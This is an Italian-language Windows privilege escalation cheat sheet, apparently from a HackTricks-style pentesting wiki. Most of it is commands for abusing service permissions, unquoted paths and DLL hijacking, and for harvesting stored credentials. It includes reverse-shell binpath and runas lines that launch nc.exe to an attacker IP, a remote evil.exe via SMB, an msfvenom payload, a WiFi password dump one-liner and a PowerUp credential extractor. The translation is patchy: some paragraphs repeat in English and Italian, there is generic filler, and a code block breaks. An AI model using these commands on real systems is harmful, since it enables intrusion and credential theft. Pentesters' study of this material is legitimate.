Puoi utilizzare **sc** per ottenere informazioni su un servizio.
```bash
sc qc <service_name>
```
È consigliato avere il binario **accesschk** da _Sysinternals_ per verificare il livello di privilegio richiesto per ogni servizio.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
È consigliato verificare se "Utenti autenticati" possono modificare qualsiasi servizio:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[È possibile scaricare accesschk.exe per XP qui](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Abilita il servizio

Se si verifica questo errore (ad esempio con SSDPSRV):

_Errore di sistema 1058._\
_Il servizio non può essere avviato perché è disabilitato o perché non ha dispositivi abilitati associati._

È possibile abilitarlo utilizzando
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Tieni presente che il servizio upnphost dipende da SSDPSRV per funzionare (per XP SP1)**

**Un altro modo** per risolvere questo problema è eseguire:
```
sc.exe config usosvc start= auto
```
### **Modifica del percorso binario del servizio**

Nello scenario in cui il gruppo "Utenti autenticati" possiede **SERVICE_ALL_ACCESS** su un servizio, è possibile modificare il percorso eseguibile binario del servizio. Per modificare ed eseguire **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Riavvio del servizio

Per ottenere privilegi di amministratore locali su un sistema Windows, è possibile sfruttare il riavvio di un servizio. Questo metodo sfrutta il fatto che alcuni servizi vengono eseguiti con privilegi elevati e che è possibile modificare il percorso del file eseguibile del servizio per eseguire un file arbitrario con privilegi di amministratore.

#### Passaggi:

1. Identificare un servizio che viene eseguito con privilegi elevati.
2. Verificare se è possibile modificare il percorso del file eseguibile del servizio.
3. Creare un file eseguibile arbitrario che eseguirà il codice desiderato con privilegi di amministratore.
4. Modificare il percorso del file eseguibile del servizio per puntare al file eseguibile creato al passaggio precedente.
5. Riavviare il servizio per eseguire il file eseguibile arbitrario con privilegi di amministratore.

È importante notare che questo metodo richiede l'accesso iniziale al sistema con privilegi di utente non amministratore.
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
I privilegi possono essere elevati attraverso varie autorizzazioni:
- **SERVICE_CHANGE_CONFIG**: Consente la riconfigurazione del file binario del servizio.
- **WRITE_DAC**: Abilita la riconfigurazione delle autorizzazioni, consentendo di modificare le configurazioni del servizio.
- **WRITE_OWNER**: Consente l'acquisizione della proprietà e la riconfigurazione delle autorizzazioni.
- **GENERIC_WRITE**: Eredità la capacità di modificare le configurazioni del servizio.
- **GENERIC_ALL**: Eredità anche la capacità di modificare le configurazioni del servizio.

Per la rilevazione e lo sfruttamento di questa vulnerabilità, può essere utilizzato l'_exploit/windows/local/service_permissions_.

### Permessi deboli dei file binari dei servizi

**Verifica se puoi modificare il file binario eseguito da un servizio** o se hai **autorizzazioni di scrittura sulla cartella** in cui si trova il file binario ([**DLL Hijacking**](dll-hijacking.md))**.**\
Puoi ottenere ogni file binario eseguito da un servizio utilizzando **wmic** (non in system32) e verificare le tue autorizzazioni utilizzando **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Puoi anche utilizzare **sc** e **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Permessi di modifica del registro dei servizi

Dovresti verificare se puoi modificare qualsiasi registro dei servizi.\
Puoi **verificare** i tuoi **permessi** su un registro dei servizi facendo:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Dovrebbe essere verificato se **Utenti autenticati** o **NT AUTHORITY\INTERACTIVE** possiedono le autorizzazioni `FullControl`. In tal caso, è possibile modificare il percorso del binario eseguito dal servizio.

Per cambiare il percorso del binario eseguito:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Permessi di AppendData/AddSubdirectory nel registro dei servizi

Se hai questo permesso su un registro, significa che **puoi creare sottoregistri da questo**. Nel caso dei servizi di Windows, questo è **sufficiente per eseguire codice arbitrario**:

{% content-ref url="appenddata-addsubdirectory-permission-over-service-registry.md" %}
[appenddata-addsubdirectory-permission-over-service-registry.md](appenddata-addsubdirectory-permission-over-service-registry.md)
{% endcontent-ref %}

### Percorsi dei servizi non quotati

Se il percorso di un eseguibile non è tra virgolette, Windows cercherà di eseguire ogni parte prima di uno spazio.

Ad esempio, per il percorso _C:\Program Files\Some Folder\Service.exe_, Windows cercherà di eseguire:
```powershell
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Elenca tutti i percorsi dei servizi non quotati, escludendo quelli appartenenti ai servizi integrati di Windows:
```bash
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\\" |findstr /i /v """
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v """ #Not only auto services

#Other way
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Puoi rilevare ed sfruttare** questa vulnerabilità con metasploit: `exploit/windows/local/trusted\_service\_path`
Puoi creare manualmente un file binario di servizio con metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Azioni di ripristino

Windows consente agli utenti di specificare le azioni da intraprendere in caso di errore di un servizio. Questa funzionalità può essere configurata per puntare a un file binario. Se questo file binario è sostituibile, potrebbe essere possibile l'elevazione dei privilegi. Ulteriori dettagli possono essere trovati nella [documentazione ufficiale](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662\(v=ws.11\)?redirectedfrom=MSDN).

## Applicazioni

### Applicazioni installate

Controlla i **permessi dei file binari** (potresti sovrascriverne uno ed elevare i privilegi) e delle **cartelle** ([DLL Hijacking](dll-hijacking.md)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Permessi di scrittura

Verifica se puoi modificare qualche file di configurazione per leggere un file speciale o se puoi modificare qualche file binario che verrà eseguito da un account Amministratore (schedtasks).

Un modo per trovare permessi deboli su cartelle/file nel sistema è eseguire:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Esegui all'avvio

**Verifica se puoi sovrascrivere qualche registro o binario che verrà eseguito da un utente diverso.**\
**Leggi** la **pagina seguente** per saperne di più sui **percorsi interessanti per l'escalation dei privilegi con gli autorun**:

{% content-ref url="privilege-escalation-with-autorun-binaries.md" %}
[privilege-escalation-with-autorun-binaries.md](privilege-escalation-with-autorun-binaries.md)
{% endcontent-ref %}

### Driver

Cerca possibili driver **strani/vulnerabili** di terze parti.
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
## PATH DLL Hijacking

Se hai **permessi di scrittura all'interno di una cartella presente nel PATH**, potresti essere in grado di dirottare una DLL caricata da un processo e **aumentare i privilegi**.

Verifica i permessi di tutte le cartelle presenti nel PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Per ulteriori informazioni su come sfruttare questo controllo:

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

## Rete

### Condivisioni
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### File hosts

Controlla se sono presenti altri computer noti codificati nel file hosts.
```
type C:\Windows\System32\drivers\etc\hosts
```
### Interfacce di rete e DNS

Le interfacce di rete sono i dispositivi hardware o virtuali che consentono al sistema di comunicare con altre reti. Possono includere schede di rete Ethernet, schede wireless, adattatori Bluetooth, interfacce virtuali e altro ancora.

Per visualizzare le interfacce di rete presenti nel sistema, è possibile utilizzare il comando `ipconfig` o `ifconfig` a seconda del sistema operativo.

```plaintext
ipconfig /all
```

```plaintext
ifconfig -a
```

I DNS (Domain Name System) sono responsabili della risoluzione dei nomi di dominio in indirizzi IP. Quando si digita un nome di dominio in un browser, il sistema utilizza i server DNS per tradurre il nome di dominio in un indirizzo IP corrispondente.

Per visualizzare i server DNS configurati nel sistema, è possibile utilizzare il comando `ipconfig /all` o `cat /etc/resolv.conf` a seconda del sistema operativo.

```plaintext
ipconfig /all
```

```plaintext
cat /etc/resolv.conf
```

È possibile modificare i server DNS configurati nel sistema modificando il file di configurazione appropriato.
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Porte aperte

Verifica i **servizi restrittivi** dall'esterno
```bash
netstat -ano #Opened ports?
```
### Tabella di routing

La tabella di routing è un componente fondamentale dei sistemi operativi che gestisce il percorso dei pacchetti di rete. Contiene una lista di destinazioni di rete e le relative interfacce di uscita. Quando un pacchetto viene inviato, il sistema operativo consulta la tabella di routing per determinare il percorso migliore da seguire.

La tabella di routing può essere visualizzata utilizzando il comando `route print` in Windows. Questo comando mostra tutte le voci nella tabella di routing, inclusi i dettagli come l'indirizzo di rete di destinazione, la maschera di sottorete, il gateway predefinito e l'interfaccia di uscita.

È possibile modificare la tabella di routing aggiungendo o rimuovendo voci utilizzando il comando `route add` o `route delete`. Questo può essere utile per configurare manualmente il percorso dei pacchetti o per risolvere problemi di connettività di rete.

È importante notare che la modifica della tabella di routing richiede privilegi di amministratore. Pertanto, per eseguire queste operazioni, è necessario disporre di privilegi di amministratore sul sistema.
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### Tabella ARP

La tabella ARP (Address Resolution Protocol) è un componente chiave nella comunicazione di rete. Questa tabella mappa gli indirizzi IP degli host di rete con i loro indirizzi MAC corrispondenti. Quando un dispositivo deve inviare un pacchetto a un altro dispositivo sulla rete, consulta la tabella ARP per ottenere l'indirizzo MAC corrispondente all'indirizzo IP di destinazione. In questo modo, il dispositivo può inviare il pacchetto al destinatario corretto.

La tabella ARP è memorizzata nella memoria cache del sistema operativo e viene aggiornata dinamicamente. Quando un dispositivo comunica con un altro dispositivo sulla rete, viene creato un record nella tabella ARP che associa l'indirizzo IP del dispositivo remoto al suo indirizzo MAC. Questo record viene mantenuto nella tabella ARP per un certo periodo di tempo, noto come tempo di vita dell'entry ARP.

La tabella ARP può essere visualizzata utilizzando il comando `arp -a` su Windows o `arp -n` su Linux. Questo comando elenca tutti gli indirizzi IP e MAC presenti nella tabella ARP del sistema. La tabella ARP può essere utile per identificare gli indirizzi IP e MAC di altri dispositivi sulla rete e per risolvere eventuali problemi di connettività di rete.
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Regole del firewall

[**Controlla questa pagina per i comandi relativi al firewall**](../basic-cmd-for-pentesters.md#firewall) **(elencare le regole, creare regole, disattivare, attivare...)**

Altri [comandi per l'enumerazione della rete qui](../basic-cmd-for-pentesters.md#network)

### Sottosistema Windows per Linux (WSL)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Il file binario `bash.exe` può essere trovato anche in `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Se ottieni l'accesso come utente root, puoi metterti in ascolto su qualsiasi porta (la prima volta che utilizzi `nc.exe` per metterti in ascolto su una porta, verrà richiesto tramite GUI se `nc` deve essere consentito dal firewall).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Per avviare facilmente bash come root, puoi provare `--default-user root`

Puoi esplorare il filesystem di `WSL` nella cartella `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Credenziali di Windows

### Credenziali di Winlogon
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Gestore delle credenziali / Windows Vault

Da [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Il Windows Vault memorizza le credenziali degli utenti per server, siti web e altri programmi a cui **Windows può accedere automaticamente**. A prima vista, potrebbe sembrare che gli utenti possano memorizzare le loro credenziali di Facebook, Twitter, Gmail, ecc., in modo da effettuare automaticamente l'accesso tramite i browser. Ma non è così.

Il Windows Vault memorizza le credenziali a cui Windows può accedere automaticamente, il che significa che qualsiasi **applicazione di Windows che necessita di credenziali per accedere a una risorsa** (server o sito web) **può utilizzare questo Gestore delle credenziali e il Windows Vault** e utilizzare le credenziali fornite invece che far inserire all'utente nome utente e password ogni volta.

A meno che le applicazioni interagiscano con il Gestore delle credenziali, non penso sia possibile utilizzare le credenziali per una determinata risorsa. Quindi, se la tua applicazione desidera utilizzare il vault, dovrebbe in qualche modo **comunicare con il gestore delle credenziali e richiedere le credenziali per quella risorsa** dalla memoria del vault predefinita.

Utilizza il comando `cmdkey` per elencare le credenziali memorizzate sulla macchina.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Quindi puoi utilizzare `runas` con l'opzione `/savecred` per utilizzare le credenziali salvate. L'esempio seguente chiama un binario remoto tramite una condivisione SMB.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Utilizzando `runas` con un insieme di credenziali fornite.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Nota che mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials\_file\_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault\_password\_view.html), o dal [modulo Powershell di Empire](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/credentials/dumpCredStore.ps1).

### DPAPI

La **Data Protection API (DPAPI)** fornisce un metodo per la crittografia simmetrica dei dati, utilizzato principalmente nel sistema operativo Windows per la crittografia simmetrica delle chiavi private asimmetriche. Questa crittografia sfrutta un segreto dell'utente o del sistema per contribuire significativamente all'entropia.

**DPAPI consente la crittografia delle chiavi attraverso una chiave simmetrica derivata dai segreti di accesso dell'utente**. Nei casi di crittografia di sistema, utilizza i segreti di autenticazione del dominio del sistema.

Le chiavi RSA dell'utente crittografate, utilizzando DPAPI, vengono memorizzate nella directory `%APPDATA%\Microsoft\Protect\{SID}`, dove `{SID}` rappresenta l'identificatore di sicurezza dell'utente ([Security Identifier](https://en.wikipedia.org/wiki/Security\_Identifier)). **La chiave DPAPI, collocata insieme alla chiave principale che protegge le chiavi private dell'utente nello stesso file**, di solito consiste in 64 byte di dati casuali. (È importante notare che l'accesso a questa directory è limitato, impedendo di elencare i suoi contenuti tramite il comando `dir` in CMD, anche se può essere elencata tramite PowerShell).
```powershell
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Puoi utilizzare il modulo **mimikatz** `dpapi::masterkey` con gli argomenti appropriati (`/pvk` o `/rpc`) per decifrarlo.

I file **di credenziali protetti dalla password principale** di solito si trovano in:
```powershell
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Puoi utilizzare il modulo **mimikatz** `dpapi::cred` con l'apposito parametro `/masterkey` per decrittografare.\
Puoi **estrarre molti masterkey DPAPI** dalla **memoria** con il modulo `sekurlsa::dpapi` (se sei root).

{% content-ref url="dpapi-extracting-passwords.md" %}
[dpapi-extracting-passwords.md](dpapi-extracting-passwords.md)
{% endcontent-ref %}

### Credenziali PowerShell

Le **credenziali PowerShell** vengono spesso utilizzate per **scripting** e attività di automazione come modo per memorizzare comodamente credenziali crittografate. Le credenziali sono protette utilizzando **DPAPI**, il che significa che di solito possono essere decrittografate solo dallo stesso utente sullo stesso computer in cui sono state create.

Per **decrittografare** le credenziali PS dal file che le contiene, puoi fare:
```powershell
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi

Il Wi-Fi è una tecnologia che consente di connettersi a una rete locale senza fili utilizzando le onde radio. È ampiamente utilizzato per l'accesso a Internet e per la condivisione di file e risorse all'interno di una rete locale. Tuttavia, il Wi-Fi può essere vulnerabile ad attacchi di hacking se non viene adeguatamente protetto.

Ecco alcune misure di sicurezza che è possibile adottare per proteggere la propria rete Wi-Fi:

1. Cambiare la password predefinita del router: La password predefinita del router è spesso facilmente accessibile e conosciuta dagli hacker. Cambiare la password del router con una password forte e unica può impedire l'accesso non autorizzato alla rete.

2. Utilizzare una crittografia sicura: Assicurarsi che la rete Wi-Fi sia protetta utilizzando una crittografia sicura come WPA2 o WPA3. Queste crittografie rendono più difficile per gli hacker intercettare e decifrare il traffico di rete.

3. Disabilitare la trasmissione del nome della rete (SSID): Disabilitare la trasmissione del nome della rete può rendere la rete meno visibile agli hacker. Tuttavia, questa misura di sicurezza può essere aggirata da hacker esperti.

4. Abilitare il filtraggio degli indirizzi MAC: Il filtraggio degli indirizzi MAC consente di specificare quali dispositivi possono accedere alla rete Wi-Fi. Aggiungere gli indirizzi MAC dei dispositivi autorizzati alla lista di accesso può impedire l'accesso non autorizzato.

5. Aggiornare il firmware del router: Gli aggiornamenti del firmware del router spesso includono correzioni di sicurezza che possono proteggere la rete da nuove vulnerabilità. Assicurarsi di mantenere il firmware del router aggiornato.

6. Utilizzare una rete guest separata: Se si desidera fornire accesso Wi-Fi agli ospiti, è consigliabile creare una rete guest separata. In questo modo, gli ospiti non avranno accesso alla rete principale e alle risorse condivise.

7. Monitorare l'attività di rete: Utilizzare strumenti di monitoraggio di rete per rilevare eventuali attività sospette sulla rete Wi-Fi. Questo può aiutare a identificare e mitigare gli attacchi di hacking in tempo reale.

Seguendo queste misure di sicurezza, è possibile proteggere la propria rete Wi-Fi da attacchi di hacking e mantenere i dispositivi e i dati al sicuro.
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Connessioni RDP salvate

Puoi trovarle su `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
e su `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Comandi eseguiti di recente
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Gestore delle credenziali di Desktop remoto**

The Remote Desktop Credential Manager is a Windows feature that allows users to save their login credentials for remote desktop connections. This feature can be exploited by an attacker to escalate their privileges on a compromised system.

Il Gestore delle credenziali di Desktop remoto è una funzionalità di Windows che consente agli utenti di salvare le proprie credenziali di accesso per le connessioni desktop remote. Questa funzionalità può essere sfruttata da un attaccante per elevare i propri privilegi su un sistema compromesso.

To exploit this vulnerability, an attacker needs to have local administrator privileges on the target system. They can then use tools like `mstsc.exe` or `mstscax.dll` to access the saved credentials and gain unauthorized access to other systems.

Per sfruttare questa vulnerabilità, un attaccante deve avere privilegi di amministratore locale sul sistema di destinazione. Possono quindi utilizzare strumenti come `mstsc.exe` o `mstscax.dll` per accedere alle credenziali salvate e ottenere accesso non autorizzato ad altri sistemi.

To prevent this type of attack, it is recommended to regularly review and delete any saved credentials in the Remote Desktop Credential Manager. Additionally, users should avoid using the same credentials for multiple systems and enable multi-factor authentication whenever possible.

Per prevenire questo tipo di attacco, si consiglia di revisionare regolarmente ed eliminare eventuali credenziali salvate nel Gestore delle credenziali di Desktop remoto. Inoltre, gli utenti dovrebbero evitare di utilizzare le stesse credenziali per più sistemi e abilitare l'autenticazione a più fattori quando possibile.
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Utilizza il modulo **Mimikatz** `dpapi::rdg` con l'appropriato `/masterkey` per **decrittografare qualsiasi file .rdg**.\
Puoi **estrarre molti masterkey DPAPI** dalla memoria con il modulo `sekurlsa::dpapi` di Mimikatz.

### Sticky Notes

Le persone spesso utilizzano l'app StickyNotes su workstation Windows per **salvare password** e altre informazioni, senza rendersi conto che si tratta di un file di database. Questo file si trova in `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` ed è sempre utile cercarlo ed esaminarlo.

### AppCmd.exe

**Nota che per recuperare le password da AppCmd.exe devi essere Amministratore e eseguire con un livello di integrità elevato.**\
**AppCmd.exe** si trova nella directory `%systemroot%\system32\inetsrv\`.\
Se questo file esiste, è possibile che siano state configurate alcune **credenziali** che possono essere **recuperate**.

Questo codice è stato estratto da [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Controlla se `C:\Windows\CCM\SCClient.exe` esiste.\
Gli installatori vengono **eseguiti con privilegi di sistema**, molti sono vulnerabili a **DLL Sideloading (Informazioni da** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## File e Registro (Credenziali)

### Credenziali di Putty

```plaintext
Putty stores its configuration in the Windows registry and the credentials used to connect to remote servers are also stored there. These credentials can be extracted from the registry and used for privilege escalation.

To extract the Putty credentials, follow these steps:

1. Open the Windows registry editor by typing `regedit` in the Run dialog (Win + R).
2. Navigate to the following registry key: `HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions`.
3. Under the `Sessions` key, you will find a list of subkeys representing the saved sessions in Putty.
4. Each subkey represents a saved session and contains the configuration settings for that session.
5. Look for the `UserName` and `Password` values under each subkey to find the stored credentials.

Once you have extracted the credentials, you can use them to escalate your privileges on the system.
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Chiavi host SSH di Putty

Putty è un popolare client SSH utilizzato per connettersi in modo sicuro a server remoti. Quando ci si connette a un server SSH utilizzando Putty, il client verifica l'autenticità del server confrontando la chiave host del server con la chiave host memorizzata nel file delle chiavi host di Putty.

Il file delle chiavi host di Putty è un file di testo che contiene le chiavi host dei server a cui ci si è connessi in passato. Queste chiavi vengono utilizzate per garantire l'integrità e l'autenticità del server remoto.

